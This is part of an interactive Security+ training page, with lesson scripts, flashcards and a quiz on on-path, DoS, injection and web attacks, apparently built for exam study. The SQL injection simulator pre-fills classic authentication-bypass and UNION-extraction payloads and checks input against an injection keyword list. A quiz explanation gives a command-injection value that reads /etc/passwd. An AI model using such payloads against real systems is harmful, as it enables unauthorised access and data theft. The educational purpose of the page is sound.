    <div class="yt-search-bar">
      <span>&#128269; Find More Videos:</span>
      <a href="https://www.youtube.com/results?search_query=security+plus+sy0-701+network+attacks" target="_blank" rel="noopener noreferrer">Security+ Network Attacks</a>
      <a href="https://www.youtube.com/results?search_query=owasp+top+10+explained+2024" target="_blank" rel="noopener noreferrer">OWASP Top 10 2024</a>
      <a href="https://www.youtube.com/results?search_query=ddos+attack+explained+2024" target="_blank" rel="noopener noreferrer">DDoS 2024</a>
    </div>

    <h3>&#128196; Reference Resources</h3>
    <div class="video-grid">
      <a class="video-card" href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener noreferrer" aria-label="OWASP Top 10 Web Application Security Risks">
        <div class="video-thumb">
          <div class="play-icon">&#128196;</div>
          <span class="source-badge article">Article</span>
          <span class="type-label">OWASP Foundation</span>
        </div>
        <div class="video-card-body">
          <h4>OWASP Top 10 — Web Application Security Risks</h4>
          <p>The definitive list of the most critical web application security risks, with detailed descriptions and prevention guidance.</p>
          <span class="video-link">owasp.org &#8599;</span>
        </div>
      </a>
      <a class="video-card" href="https://attack.mitre.org/" target="_blank" rel="noopener noreferrer" aria-label="MITRE ATT&CK Framework">
        <div class="video-thumb">
          <div class="play-icon">&#127916;</div>
          <span class="source-badge reference">Reference</span>
          <span class="type-label">MITRE ATT&CK</span>
        </div>
        <div class="video-card-body">
          <h4>MITRE ATT&amp;CK Framework</h4>
          <p>Comprehensive knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations.</p>
          <span class="video-link">attack.mitre.org &#8599;</span>
        </div>
      </a>
      <a class="video-card" href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" aria-label="PortSwigger Web Security Academy">
        <div class="video-thumb">
          <div class="play-icon">&#128187;</div>
          <span class="source-badge">Lab</span>
          <span class="type-label">PortSwigger</span>
        </div>
        <div class="video-card-body">
          <h4>Web Security Academy — Free Labs</h4>
          <p>Free, interactive web security training with hands-on labs covering SQL injection, XSS, CSRF, SSRF, and dozens more vulnerabilities.</p>
          <span class="video-link">portswigger.net &#8599;</span>
        </div>
      </a>
      <a class="video-card" href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" rel="noopener noreferrer" aria-label="CISA Known Exploited Vulnerabilities">
        <div class="video-thumb">
          <div class="play-icon">&#128737;</div>
          <span class="source-badge article">Government</span>
          <span class="type-label">CISA</span>
        </div>
        <div class="video-card-body">
          <h4>CISA Known Exploited Vulnerabilities Catalog</h4>
          <p>Official U.S. government catalog of vulnerabilities actively exploited in the wild, with remediation deadlines for federal agencies.</p>
          <span class="video-link">cisa.gov &#8599;</span>
        </div>
      </a>
      <a class="video-card" href="https://www.professormesser.com/security-plus/sy0-701/sy0-701-video/sy0-701-comptia-security-study-groups/" target="_blank" rel="noopener noreferrer" aria-label="Professor Messer Security+ Study Groups">
        <div class="video-thumb">
          <div class="play-icon">&#127979;</div>
          <span class="source-badge">Study</span>
          <span class="type-label">Professor Messer</span>
        </div>
        <div class="video-card-body">
          <h4>Security+ SY0-701 Study Group</h4>
          <p>Weekly live study group sessions covering all SY0-701 exam objectives with Q&amp;A and practice questions.</p>
          <span class="video-link">professormesser.com &#8599;</span>
        </div>
      </a>
      <a class="video-card" href="https://nvd.nist.gov/" target="_blank" rel="noopener noreferrer" aria-label="NIST National Vulnerability Database">
        <div class="video-thumb">
          <div class="play-icon">&#128203;</div>
          <span class="source-badge reference">Reference</span>
          <span class="type-label">NIST NVD</span>
        </div>
        <div class="video-card-body">
          <h4>NIST National Vulnerability Database (NVD)</h4>
          <p>Comprehensive database of CVEs with CVSS severity scores, attack vectors, and remediation information.</p>
          <span class="video-link">nvd.nist.gov &#8599;</span>
        </div>
      </a>
    </div>

    <h3>&#128203; Mitigation Checklist</h3>
    <p>Use this checklist to verify defenses against the attacks covered in this lesson. Click each item to mark it as reviewed.</p>
    <ul class="checklist" id="mitigationChecklist" aria-label="Security mitigation checklist">
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Enable Dynamic ARP Inspection (DAI) on managed switches</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Deploy DNSSEC and configure DNS-over-HTTPS (DoH) for resolvers</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Enforce HTTPS everywhere; configure HSTS with preloading</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Enable SYN cookies on servers and rate-limit inbound SYN packets</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Use parameterized queries / prepared statements in all database code</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Implement Content Security Policy (CSP) headers to prevent XSS</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Set HttpOnly and Secure flags on all session cookies; add SameSite attribute</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Implement CSRF tokens for all state-changing form submissions</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Enable ASLR, DEP/NX on all servers and endpoints</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Validate and sanitize all user input; never pass to shell commands directly</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Subscribe to DDoS mitigation service (cloud scrubbing / anycast)</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Deploy WAF with OWASP Core Rule Set in front of web applications</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Apply least-privilege principle to all database, service, and user accounts</li>
      <li onclick="this.classList.toggle('checked')" tabindex="0" onkeydown="if(event.key==='Enter')this.classList.toggle('checked')" role="checkbox" aria-checked="false">Enable MFA on domain registrar and DNS management accounts</li>
    </ul>

    <div style="margin-top: 32px; text-align:center;">
      <button class="btn btn-gold" onclick="goToSection(0)" aria-label="Return to lesson overview">&#8617; Back to Overview</button>
    </div>
  </div>
</section>

</main>

<script>
/* ===================================================================
   NAVIGATION & PROGRESS
=================================================================== */
const totalSections = 10;
const visited = new Set([0]);

function goToSection(idx) {
  // Hide all
  document.querySelectorAll('.lesson-section').forEach(s => s.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(b => {
    b.classList.remove('active');
    b.removeAttribute('aria-current');
  });

  // Show target
  document.getElementById('section-' + idx).classList.add('active');
  const btn = document.querySelector(`[data-section="${idx}"]`);
  if (btn) { btn.classList.add('active'); btn.setAttribute('aria-current','true'); }

  // Mark previous as completed
  visited.add(idx);
  document.querySelectorAll('.nav-btn').forEach(b => {
    const s = parseInt(b.getAttribute('data-section'));
    if (visited.has(s) && s !== idx) b.classList.add('completed');
  });

  updateProgress();
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

function updateProgress() {
  const pct = Math.round((visited.size / totalSections) * 100);
  document.getElementById('progressBarInner').style.width = pct + '%';
  document.getElementById('progressPct').textContent = pct + '%';
  const pb = document.querySelector('.progress-bar-outer');
  if (pb) { pb.setAttribute('aria-valuenow', pct); }
}

// Nav click handlers
document.querySelectorAll('.nav-btn').forEach(btn => {
  btn.addEventListener('click', function() {
    goToSection(parseInt(this.getAttribute('data-section')));
  });
});

/* ===================================================================
   SUB-TABS
=================================================================== */
document.querySelectorAll('.sub-tab-btn').forEach(btn => {
  btn.addEventListener('click', function() {
    const parent = this.closest('.section-body');
    parent.querySelectorAll('.sub-tab-btn').forEach(b => { b.classList.remove('active'); b.setAttribute('aria-selected','false'); });
    parent.querySelectorAll('.sub-tab-content').forEach(c => c.classList.remove('active'));
    this.classList.add('active'); this.setAttribute('aria-selected','true');
    const target = parent.querySelector('#' + this.getAttribute('data-tab'));
    if (target) target.classList.add('active');
  });
});

/* ===================================================================
   ACCORDION
=================================================================== */
document.querySelectorAll('.accordion-header').forEach(btn => {
  btn.addEventListener('click', function() {
    const item = this.closest('.accordion-item');
    const isOpen = item.classList.contains('open');
    // Close all in same accordion group
    const group = this.closest('.accordion');
    if (group) {
      group.querySelectorAll('.accordion-item').forEach(i => {
        i.classList.remove('open');
        i.querySelector('.accordion-header').setAttribute('aria-expanded','false');
      });
    }
    if (!isOpen) {
      item.classList.add('open');
      this.setAttribute('aria-expanded','true');
    }
  });
});

/* ===================================================================
   FLOW DETAILS (On-Path Attack Diagram)
=================================================================== */
const flowDetails = {
  mitm: [
    'Alice sends a request believing she is communicating directly with Bob\'s server. Normally, traffic routes through the network path between them.',
    'The attacker has positioned themselves on the network path — through ARP poisoning, rogue Wi-Fi AP, BGP hijacking, or DNS spoofing — so Alice\'s traffic routes through the attacker\'s system first.',
    'The attacker forwards the (possibly modified) request to the real server. The server responds normally, believing it is communicating with Alice directly.',
    'The attacker may modify the server\'s response — injecting malicious scripts, changing account numbers, or logging credentials — before forwarding it to Alice.',
    'Alice receives the (potentially modified) response with no indication that her communication was intercepted. Both parties are unaware of the attack.'
  ]
};

function showFlowDetail(diagramId, stepIdx) {
  const allDetails = document.querySelectorAll(`[id^="${diagramId}-detail-"]`);
  allDetails.forEach(d => d.classList.remove('visible'));
  const detail = document.getElementById(`${diagramId}-detail-${stepIdx}`);
  if (detail) {
    detail.textContent = flowDetails[diagramId][stepIdx];
    detail.classList.add('visible');
  }
}

/* ===================================================================
   ARP PHASE DETAIL
=================================================================== */
const arpPhases = [
  '🟢 Normal ARP Operation: When Host A needs to communicate with Host B, it broadcasts an ARP request: "Who has IP 192.168.1.1? Tell Host A (MAC: AA:BB:CC:DD:EE:FF)." Host B replies with its real MAC address. Both hosts cache this mapping in their ARP tables for future use.',
  '🔴 ARP Poisoning: The attacker sends gratuitous (unsolicited) ARP reply packets to all devices on the network segment: "192.168.1.1 (the gateway) is at MAC: AA:AA:AA:AA:AA:AA (attacker\'s MAC)." Because ARP is stateless, devices accept and cache these replies without verification.',
  '🔴 Traffic Redirection: Now all devices on the subnet have poisoned ARP caches. When Host A sends traffic destined for the gateway (192.168.1.1), the switch forwards it to the attacker\'s device (AA:AA:AA:AA:AA:AA) instead of the real gateway. The attacker receives all traffic meant for the gateway.',
  '🔴 MITM Established: The attacker now sits between all local hosts and the internet gateway. They can read all unencrypted traffic, strip TLS connections (SSL stripping), inject responses, capture credentials, and forward traffic (to remain undetected). Tools like Ettercap or Bettercap automate this entire process.'
];

function showArpPhase(idx) {
  const detail = document.getElementById('arp-phase-detail');
  detail.textContent = arpPhases[idx];
  detail.style.display = 'block';
  detail.style.animation = 'none';
  void detail.offsetWidth; // reflow
  detail.style.animation = 'fadeUp .3s ease';
}

/* ===================================================================
   MITB LIFECYCLE
=================================================================== */
const mitbDetails = [
  'A Trojan horse (often delivered via phishing email, malicious download, or exploit kit drive-by download) infects the victim\'s computer. The user typically sees no visible indication of infection. Modern Trojans may use rootkit techniques to hide from antivirus tools.',
  'The Trojan installs a malicious browser extension, Browser Helper Object (BHO), or hooks into browser APIs using DLL injection. This gives the malware full visibility into all browser activity, including pages viewed, data submitted, and responses received — all after TLS decryption.',
  'The malware monitors browser activity and remains dormant until the user navigates to a targeted site (e.g., online banking portal, payment processor, or corporate application). Target site lists are often downloaded from attacker command-and-control servers and updated remotely.',
  'When the user submits a transaction on the targeted site, the malware intercepts the data after the user has confirmed it — and before it is encrypted and transmitted. Values such as transfer amounts and destination accounts can be silently modified. The attacker may relay the original form data to avoid triggering fraud detection.',
  'Captured credentials, one-time passwords, session tokens, and transaction details are transmitted to attacker-controlled servers. The legitimate transaction may appear to complete normally. The victim only discovers the attack when reviewing bank statements or through out-of-band transaction notifications.'
];

function showLifecycleDetail(type, idx) {
  const detail = document.getElementById(type + '-' + idx);
  const allDetails = document.querySelectorAll(`[id^="${type}-"]`);
  allDetails.forEach(d => d.classList.remove('visible'));
  if (detail) {
    detail.textContent = mitbDetails[idx];
    detail.classList.add('visible');
  }
  // Update ARIA
  document.querySelectorAll('.lifecycle-circle').forEach((c, i) => {
    c.classList.toggle('active', i === idx);
  });
}

/* ===================================================================
   SQL INJECTION SIMULATOR
=================================================================== */
function runSqlSim() {
  const user = document.getElementById('sqlUsername').value;
  const pass = document.getElementById('sqlPassword').value;
  const queryEl = document.getElementById('sqlQueryDisplay');
  const resultEl = document.getElementById('sqlResultDisplay');
  
  // Check for injection
  const injectionPatterns = ["'", '"', '--', ';', 'OR', 'UNION', 'DROP', 'SELECT', 'INSERT', 'UPDATE', 'DELETE', '/*', '*/'];
  const hasInjection = injectionPatterns.some(p => user.toUpperCase().includes(p.toUpperCase()) || pass.toUpperCase().includes(p.toUpperCase()));
  
  // Build query display (show what the vulnerable query looks like)
  let queryHtml = `SELECT * FROM users WHERE username = '<span style="color:#66ccff;">${escapeHtml(user)}</span>' AND password = '<span style="color:#66ccff;">${escapeHtml(pass)}</span>'`;
  
  if (hasInjection) {
    // Highlight injection
    queryHtml = `SELECT * FROM users WHERE username = '<span class="sql-inject-highlight">${escapeHtml(user)}</span>' AND password = '<span class="sql-inject-highlight">${escapeHtml(pass)}</span>'`;
    queryEl.innerHTML = queryHtml;
    
    // Simulate injection results
    if (user.includes("' OR '1'='1") || user.includes("'--") || user.includes("' OR 1=1")) {
      resultEl.innerHTML = '⚠️ INJECTION DETECTED: Authentication bypass successful! Query always evaluates to TRUE.<br>Result: Logged in as admin without knowing the password.<br><br>username: admin | role: ADMINISTRATOR | last_login: 2025-02-28';
      resultEl.className = 'sql-result-display danger';
    } else if (user.toUpperCase().includes('UNION')) {
      resultEl.innerHTML = '⚠️ INJECTION DETECTED: UNION attack — attempting to extract data from other tables.<br><br>Possible result: username, password_hash, email, ssn from users table...';
      resultEl.className = 'sql-result-display danger';
    } else if (user.toUpperCase().includes('DROP')) {
      resultEl.innerHTML = '⚠️ INJECTION DETECTED: Destructive SQL detected — DROP TABLE statement.<br>In a vulnerable system, this could delete the entire users table!';
      resultEl.className = 'sql-result-display danger';
    } else {
      resultEl.innerHTML = '⚠️ Potential injection detected. Input contains SQL special characters.';
      resultEl.className = 'sql-result-display danger';
    }
  } else {
    queryEl.innerHTML = queryHtml;
    // Normal login check simulation
    if (user === 'admin' && pass === 'password123') {
      resultEl.textContent = '✓ Login successful. Welcome, admin.';
      resultEl.className = 'sql-result-display success';
    } else {
      resultEl.textContent = '✗ Invalid credentials. 0 rows returned.';
      resultEl.className = 'sql-result-display';
    }
  }
}

function injectSqlBypass() {
  document.getElementById('sqlUsername').value = "' OR '1'='1' --";
  document.getElementById('sqlPassword').value = 'anything';
  runSqlSim();
}

function injectSqlUnion() {
  document.getElementById('sqlUsername').value = "' UNION SELECT username, password FROM users--";
  document.getElementById('sqlPassword').value = 'x';
  runSqlSim();
}

function resetSqlSim() {
  document.getElementById('sqlUsername').value = 'admin';
  document.getElementById('sqlPassword').value = 'password123';
  document.getElementById('sqlQueryDisplay').innerHTML = 'Click "Run Query" to see the generated SQL statement.';
  document.getElementById('sqlResultDisplay').textContent = 'Awaiting query...';
  document.getElementById('sqlResultDisplay').className = 'sql-result-display';
}

function escapeHtml(str) {
  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
}

/* ===================================================================
   XSS SANDBOX
=================================================================== */
function renderXssUnsafe() {
  const input = document.getElementById('xssInput').value;
  const out = document.getElementById('xssUnsafeOut');
  // Safely show what would happen — use textContent to show the raw value but label it
  // We simulate by showing the raw HTML string it would inject
  out.textContent = '';
  const warning = document.createElement('div');
  warning.style.cssText = 'color:var(--danger); font-weight:700; font-size:.82rem; margin-bottom:8px;';
  warning.textContent = '⚠️ In a vulnerable app, this HTML would be rendered:';
  out.appendChild(warning);
  const code = document.createElement('code');
  code.style.cssText = 'display:block; background:#f5f5f5; padding:8px; border-radius:4px; font-size:.82rem; word-break:break-all; color:#cc0000;';
  code.textContent = input;
  out.appendChild(code);
  if (input.includes('<script') || input.includes('onerror') || input.includes('onclick')) {
    const note = document.createElement('div');
    note.style.cssText = 'color:var(--danger); font-size:.8rem; margin-top:8px; font-weight:700;';
    note.textContent = '🚨 Script detected! In a real vulnerable app, this JavaScript would execute in the victim\'s browser context.';
    out.appendChild(note);
  }
}

function renderXssSafe() {
  const input = document.getElementById('xssInput').value;
  const out = document.getElementById('xssSafeOut');
  out.textContent = '';
  const note = document.createElement('div');
  note.style.cssText = 'color:var(--green-ok); font-weight:700; font-size:.82rem; margin-bottom:8px;';
  note.textContent = '✓ Secured: HTML-encoded before rendering:';
  out.appendChild(note);
  const rendered = document.createElement('div');
  // textContent auto-encodes — this is the safe way
  rendered.textContent = input;
  rendered.style.cssText = 'background:#f0fff0; padding:8px; border-radius:4px; border:1px solid var(--green-ok);';
  out.appendChild(rendered);
  const enc = document.createElement('div');
  enc.style.cssText = 'color:var(--mid-gray); font-size:.78rem; margin-top:8px;';
  enc.textContent = 'Encoded: ' + escapeHtml(input);
  out.appendChild(enc);
}

/* ===================================================================
   YOUTUBE EMBED (dual-mode: file:// vs HTTP)
=================================================================== */
const isLocalFile = window.location.protocol === 'file:';

function loadYT(containerId, videoId, facadeBtn) {
  if (isLocalFile) {
    window.open('https://www.youtube.com/watch?v=' + videoId, '_blank');
    return;
  }
  const container = document.getElementById(containerId);
  const facade = facadeBtn;
  container.style.display = 'block';
  container.innerHTML = `<iframe src="https://www.youtube.com/embed/${videoId}?autoplay=1&rel=0" 
    title="Educational video" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
    allowfullscreen style="position:absolute;top:0;left:0;width:100%;height:100%;border:0;"></iframe>`;
  if (facade) facade.style.display = 'none';
}

// Show ext badges on file:// protocol
if (isLocalFile) {
  document.querySelectorAll('[id^="ext-badge-"]').forEach(b => b.style.display = 'block');
}

/* ===================================================================
   FLASHCARDS
=================================================================== */
let flashcards = [
  { term: 'On-Path Attack (MITM)', def: 'An attack where a threat actor intercepts and potentially modifies communication between two parties without their knowledge, by positioning themselves on the communication path. Previously called "Man-in-the-Middle" (MITM) in older Security+ versions.' },
  { term: 'Man-in-the-Browser (MITB)', def: 'An attack where a Trojan horse installs a malicious browser extension or API hook that intercepts and modifies web transactions between the browser and the underlying computer — occurring after TLS decryption.' },
  { term: 'Replay Attack', def: 'An attack where a valid data transmission is captured (e.g., authentication credentials or session token) and retransmitted at a later time to gain unauthorized access without knowing the actual credentials.' },
  { term: 'ARP Poisoning', def: 'An attack that floods a network with fake ARP replies, associating the attacker\'s MAC address with a legitimate IP address (such as the default gateway), redirecting traffic through the attacker.' },
  { term: 'DNS Poisoning', def: 'An attack that injects false DNS records into a resolver\'s cache, causing clients to receive malicious IP addresses and connect to attacker-controlled servers instead of legitimate ones.' },
  { term: 'Privilege Escalation', def: 'An attack where a threat actor exploits a vulnerability to gain access to resources or capabilities beyond those normally granted. Vertical = lower to higher privilege; Horizontal = same level but different user.' },
  { term: 'SYN Flood', def: 'A DoS attack that exploits the TCP three-way handshake by sending many SYN packets with spoofed source IPs, filling the server\'s half-open connection table until it can no longer accept legitimate connections.' },
  { term: 'DNS Amplification Attack', def: 'A volumetric DDoS attack that exploits open DNS resolvers by sending small queries with the victim\'s spoofed IP as the source, causing DNS servers to send large responses (50-70x amplification) to the victim.' },
  { term: 'Cross-Site Scripting (XSS)', def: 'An attack that injects malicious client-side scripts into web pages viewed by other users. Types: Stored (persistent, server-side), Reflected (URL-based), DOM-based (client-side only). Succeeds when apps accept unvalidated input.' },
  { term: 'Cross-Site Request Forgery (CSRF/XSRF)', def: 'An attack that tricks a victim\'s browser into making unauthorized requests to a web application where the victim is authenticated. Exploits the browser\'s automatic inclusion of cookies. Prevented with CSRF tokens and SameSite cookies.' },
  { term: 'SQL Injection', def: 'An injection attack that inserts malicious SQL code into unvalidated input fields, altering database queries to bypass authentication, extract data, or modify/delete records. Prevented by parameterized queries/prepared statements.' },
  { term: 'Command Injection', def: 'An attack that passes malicious OS commands through a vulnerable application that unsafely passes user input to a system shell. Attackers append shell operators (;, &&, |) to execute arbitrary commands.' },
  { term: 'Directory Traversal', def: 'An attack using ../ sequences in file paths to navigate outside the web root directory and access sensitive server files (e.g., configuration files, /etc/passwd) that are not meant to be publicly accessible.' },
  { term: 'Session Hijacking', def: 'An attack where a threat actor obtains and uses a valid session token to impersonate an authenticated user without knowing their credentials. Session tokens may be stolen via XSS, network sniffing, or prediction.' },
  { term: 'Clickjacking (UI Redressing)', def: 'An attack that overlays a transparent or invisible iframe over a visible web page, tricking users into clicking hidden buttons or links. Prevented with X-Frame-Options or CSP frame-ancestors headers.' },
  { term: 'Buffer Overflow', def: 'A vulnerability that occurs when a program writes more data to a fixed-length memory buffer than it can hold, overflowing into adjacent memory. Can overwrite the return address to redirect program execution to attacker code (shellcode).' },
  { term: 'Integer Overflow', def: 'A vulnerability where an arithmetic operation produces a value outside the range the variable type can hold. In security-critical calculations (e.g., buffer sizes), this can lead to incorrectly sized allocations and buffer overflows.' },
  { term: 'Malvertising', def: 'The use of legitimate online advertising networks to distribute malware. Attackers purchase ad space and serve ads containing exploit code that may execute without user interaction via drive-by download attacks.' },
  { term: 'SSL Stripping', def: 'An MITM technique that downgrades a victim\'s HTTPS connection to HTTP by the attacker maintaining HTTPS with the server while presenting only HTTP to the client. Defeated by HSTS (HTTP Strict Transport Security).' },
  { term: 'DNSSEC', def: 'DNS Security Extensions — adds cryptographic signatures to DNS records, allowing resolvers to verify that DNS responses are authentic and have not been tampered with. Prevents DNS cache poisoning but does not encrypt DNS traffic.' },
  { term: 'Dynamic ARP Inspection (DAI)', def: 'A switch security feature that validates ARP packets against a DHCP snooping binding table. Packets with mismatched MAC-to-IP mappings are dropped, preventing ARP poisoning attacks.' },
  { term: 'Botnet', def: 'A network of compromised devices ("zombies") controlled remotely by an attacker via Command and Control (C2) infrastructure. Commonly used to conduct DDoS attacks, send spam, or mine cryptocurrency.' }
];

let fcIndex = 0;
let fcOrder = [...Array(flashcards.length).keys()];

function renderCard() {
  const card = flashcards[fcOrder[fcIndex]];
  document.getElementById('fcTerm').textContent = card.term;
  document.getElementById('fcDef').textContent = card.def;
  document.getElementById('fcCounter').textContent = (fcIndex + 1) + ' / ' + flashcards.length;
  document.getElementById('flashcard').classList.remove('flipped');
}

function flipCard() {
  document.getElementById('flashcard').classList.toggle('flipped');
}

function nextCard() {
  fcIndex = (fcIndex + 1) % flashcards.length;
  renderCard();
}

function prevCard() {
  fcIndex = (fcIndex - 1 + flashcards.length) % flashcards.length;
  renderCard();
}

function shuffleCards() {
  for (let i = fcOrder.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [fcOrder[i], fcOrder[j]] = [fcOrder[j], fcOrder[i]];
  }
  fcIndex = 0;
  renderCard();
}

renderCard();

/* ===================================================================
   QUIZ
=================================================================== */
const quizData = [
  { q: 'A security analyst detects that the ARP cache on multiple workstations shows the gateway\'s IP address mapped to an unexpected MAC address. What attack is most likely occurring?', opts: ['DNS Poisoning', 'ARP Poisoning / ARP Spoofing', 'SYN Flood', 'Session Hijacking'], ans: 1, exp: 'Unexpected MAC address mappings in ARP caches are the hallmark of ARP poisoning. The attacker has sent gratuitous ARP replies to associate their MAC with the gateway\'s IP, enabling a man-in-the-middle position.' },
  { q: 'A web application passes a search query parameter directly into a SQL statement without validation. An attacker enters the value: \' OR \'1\'=\'1\' -- What is the attacker attempting?', opts: ['Buffer overflow to crash the database', 'SQL injection to bypass authentication', 'Cross-site scripting to steal cookies', 'Directory traversal to access files'], ans: 1, exp: 'The payload \' OR \'1\'=\'1\' -- is a classic SQL injection authentication bypass. It closes the string, adds a condition that is always true, and comments out the rest of the WHERE clause, causing the query to return all records regardless of credentials.' },
  { q: 'A user receives an email with a link. After clicking it, they are directed to what appears to be a normal page. Later, their bank account shows an unauthorized transfer. The user was logged into online banking in another browser tab. What attack occurred?', opts: ['Phishing', 'Session Hijacking via XSS', 'Cross-Site Request Forgery (CSRF)', 'Man-in-the-Browser'], ans: 2, exp: 'This is a CSRF attack. The malicious page made an unauthorized request to the banking site using the victim\'s active session cookie, which the browser automatically included. The bank processed it as legitimate. CSRF tokens and SameSite cookies prevent this attack.' },
  { q: 'An organization\'s web server becomes unavailable after receiving millions of TCP SYN packets from random spoofed IP addresses. The server\'s connection table is exhausted. What attack type is this?', opts: ['Smurf Attack', 'DNS Amplification', 'SYN Flood', 'Ping of Death'], ans: 2, exp: 'A SYN flood exploits the TCP three-way handshake. Spoofed SYN packets cause the server to allocate resources for half-open connections and send SYN-ACKs to non-existent hosts. When the connection table fills, the server can no longer accept legitimate connections. SYN cookies are the primary mitigation.' },
  { q: 'A stored XSS payload is injected into a blog\'s comment section. When other users view the page, the script runs and sends their session cookies to an attacker\'s server. What makes this attack successful?', opts: ['The blog uses HTTP instead of HTTPS', 'The application renders user input as HTML without encoding it', 'The attacker has physical access to the server', 'The users are running outdated browsers'], ans: 1, exp: 'Stored XSS succeeds when an application stores user-supplied content and later renders it as HTML without proper output encoding. Setting the HttpOnly flag on session cookies would prevent JavaScript from reading them. Content Security Policy (CSP) would block execution of unauthorized scripts.' },
  { q: 'During a security audit, a tester discovers that by changing a URL parameter from /api/users/100 to /api/users/101, they can view another user\'s private data. What vulnerability is this?', opts: ['SQL Injection', 'Directory Traversal', 'Broken Object Level Authorization (BOLA/IDOR)', 'Privilege Escalation'], ans: 2, exp: 'This is Broken Object Level Authorization (BOLA), also known as Insecure Direct Object Reference (IDOR) — the #1 OWASP API Security risk. The API returns another user\'s data without verifying the requesting user is authorized to access that specific resource. Authorization checks must be enforced at the object level.' },
  { q: 'An attacker sends a DNS query for a large TXT record to multiple open DNS resolvers, with the victim\'s IP as the spoofed source. The resolvers send their large responses to the victim. What attack is this?', opts: ['DNS Spoofing', 'DNS Cache Poisoning', 'DNS Amplification DDoS', 'DNS Tunneling'], ans: 2, exp: 'DNS amplification is a volumetric DDoS attack that uses open resolvers to amplify attack traffic. A small query produces a large response (up to 50-70x amplification) sent to the spoofed victim IP. Defenses include BCP38 ingress filtering, disabling open recursion, and DNS response rate limiting.' },
  { q: 'A web developer uses the following PHP code: system("ping " . $_GET[\'host\']); What vulnerability does this code contain?', opts: ['SQL Injection', 'Command Injection', 'Buffer Overflow', 'Path Traversal'], ans: 1, exp: 'This code is vulnerable to OS command injection. If an attacker submits host=127.0.0.1;cat /etc/passwd, the semicolon terminates the ping command and executes the second command. Never pass user input directly to shell execution functions. Use language-specific APIs and input validation instead.' },
  { q: 'A man-in-the-browser (MITB) attack successfully intercepts a banking transaction even though the site uses TLS 1.3. Why does TLS fail to protect against MITB?', opts: ['TLS 1.3 has known vulnerabilities that MITB exploits', 'MITB operates after TLS decryption, inside the browser', 'The bank\'s certificate has expired', 'MITB attacks only work on HTTP connections'], ans: 1, exp: 'MITB attacks succeed against TLS because they operate within the browser\'s trusted context, after the browser has already decrypted the TLS traffic. The malware hooks browser APIs to intercept data between the browser and user — TLS protects data in transit but cannot protect against compromised endpoint software.' },
  { q: 'What is the MOST effective defense against SQL injection attacks?', opts: ['Input validation and blacklisting SQL keywords', 'Web Application Firewall (WAF)', 'Parameterized queries / prepared statements', 'Encrypting the database'], ans: 2, exp: 'Parameterized queries (prepared statements) are the most effective defense against SQL injection. They separate SQL code from data — the query structure is fixed before user input is supplied, making it impossible for input to be interpreted as SQL code. Blacklisting is bypassed by encoding; WAFs provide defense-in-depth but not a primary fix.' },
  { q: 'Which HTTP response header is specifically designed to prevent clickjacking attacks?', opts: ['Strict-Transport-Security', 'X-Content-Type-Options', 'X-Frame-Options', 'Content-Security-Policy: default-src'], ans: 2, exp: 'X-Frame-Options (with values DENY or SAMEORIGIN) prevents a browser from rendering a page inside an iframe, directly blocking clickjacking/UI redressing attacks. The modern equivalent is Content-Security-Policy: frame-ancestors. Note: CSP\'s frame-ancestors supersedes X-Frame-Options where supported.' },
  { q: 'A standard user account is able to run a script that exploits a misconfigured SUID binary and gains root access on a Linux server. What type of attack is this?', opts: ['Horizontal privilege escalation', 'Vertical privilege escalation', 'Session hijacking', 'Pass-the-hash attack'], ans: 1, exp: 'This is vertical privilege escalation — a lower-privileged user (standard account) gains capabilities reserved for a higher-privileged user (root/Administrator). SUID misconfigurations, kernel exploits, and weak sudo rules are common vertical escalation vectors. Horizontal escalation occurs at the same privilege level.' }
];

function buildQuiz() {
  const container = document.getElementById('quizContainer');
  container.innerHTML = '';
  quizData.forEach((item, i) => {
    let optionsHtml = '';
    item.opts.forEach((opt, j) => {
      optionsHtml += `<label class="quiz-option" id="qopt-${i}-${j}">
        <input type="radio" name="q${i}" value="${j}" aria-label="${opt}"> ${opt}
      </label>`;
    });
    container.innerHTML += `<div class="quiz-question" id="qq-${i}">
      <div class="q-text"><span class="q-number" aria-hidden="true">${i+1}</span>${item.q}</div>
      ${optionsHtml}
      <div class="quiz-feedback" id="qfb-${i}" role="alert"></div>
